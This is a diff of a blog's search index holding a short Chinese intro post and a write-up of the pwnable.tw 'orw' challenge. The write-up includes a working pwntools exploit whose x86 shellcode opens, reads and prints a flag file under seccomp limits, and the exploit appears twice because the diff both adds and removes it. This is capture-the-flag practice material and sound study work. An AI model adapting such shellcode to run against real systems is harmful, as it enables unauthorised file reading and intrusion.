@@ -1,6 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Why begins?</title>
+    <url>/Why-begins/</url>
+    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
+<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
+<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
+<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
+<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
+<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
+      <categories>
+        <category>杂</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>orw</title>
+    <url>/orw/</url>
+    <content><![CDATA[<h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw - orw"></a>pwnable.tw - orw</h2><span id="more"></span>
+
+<hr>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>丢进ida可以发现有个orw_seccomp函数，于是用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看限制：</p>
+<p><img src="https://i.loli.net/2021/07/10/WnQ5zPIfiR8gujA.png"></p>
+<p>只能用open，read，write。</p>
+<p>已知flag在<code>/home/orw/flag</code>，那只需要open它，read它，再write到标准输出就行</p>
+<p>并且这个程序流程就是输入shellcode并运行，那直接构造shellcode就行</p>
+<p>值得注意的点： 函数的返回值在eax中，在read的时候先把eax给ebx，再改为read的系统调用号</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call op</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">op:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov edx,0xff</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendafter(<span class="string">&quot;shellcode:&quot;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwnable.tw</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Start</title>
     <url>/Start/</url>
     <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>
@@ -37,41 +72,6 @@
       </categories>
       <tags>
         <tag>stackoverflow</tag>
-        <tag>shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Why begins?</title>
-    <url>/Why-begins/</url>
-    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
-<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
-<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
-<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
-<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
-<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
-      <categories>
-        <category>杂</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>orw</title>
-    <url>/orw/</url>
-    <content><![CDATA[<h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw - orw"></a>pwnable.tw - orw</h2><span id="more"></span>
-
-<hr>
-<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>丢进ida可以发现有个orw_seccomp函数，于是用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看限制：</p>
-<p><img src="https://i.loli.net/2021/07/10/WnQ5zPIfiR8gujA.png"></p>
-<p>只能用open，read，write。</p>
-<p>已知flag在<code>/home/orw/flag</code>，那只需要open它，read它，再write到标准输出就行</p>
-<p>并且这个程序流程就是输入shellcode并运行，那直接构造shellcode就行</p>
-<p>值得注意的点： 函数的返回值在eax中，在read的时候先把eax给ebx，再改为read的系统调用号</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call op</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">op:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov edx,0xff</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendafter(<span class="string">&quot;shellcode:&quot;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwnable.tw</category>
-      </categories>
-      <tags>
         <tag>shellcode</tag>
       </tags>
   </entry>
